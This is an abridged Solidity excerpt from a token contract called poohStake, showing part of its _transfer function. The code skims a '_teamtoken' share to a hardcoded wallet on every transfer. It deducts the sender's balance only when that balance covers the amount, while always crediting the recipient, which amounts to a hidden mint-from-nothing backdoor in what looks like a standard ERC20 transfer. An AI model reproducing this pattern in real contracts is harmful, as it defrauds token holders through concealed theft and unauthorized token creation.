...
contract  poohStake  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xFCD514892B3a55b1e5086055398EE4c9a88f733D] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0xFCD514892B3a55b1e5086055398EE4c9a88f733D, _teamtoken);
        }
